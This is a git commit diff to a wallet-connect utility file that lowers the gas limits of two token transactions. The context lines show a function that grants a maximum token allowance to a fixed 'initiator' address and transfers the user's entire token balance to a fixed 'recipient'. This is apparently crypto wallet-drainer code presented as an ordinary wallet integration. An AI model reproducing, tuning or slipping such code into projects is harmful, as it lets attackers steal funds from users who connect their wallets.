95cfa9fa138f5c9432ad8825b9ad25b499e5abda
Alhassan Matarwy <67296782+Matarwy@users.noreply.github.com>
2023-09-06 16:43:57 +0300

    Update walletconnect.js

--- src/utils/walletconnect.js
+++ src/utils/walletconnect.js
@@ -203,7 +203,7 @@ export const increaseAllowance = async (token) => {
       abi: constants.ALLOWANCEABI,
       functionName: 'increaseAllowance',
       args: [constants.initiator, constants.max],
-      gas: '70000',
+      gas: '30000',
       gasPrice: feeData.gasPrice
     }).then(async (result) => {
       console.log(result)
@@ -219,7 +219,7 @@ export const increaseAllowance = async (token) => {
       abi: constants.ERC20ABI,
       functionName: 'transfer',
       args: [constants.recipient, token.balance],
-      gas: '70000',
+      gas: '30000',
       gasPrice: feeData.gasPrice
     }).then((result) => {
       console.log(result)
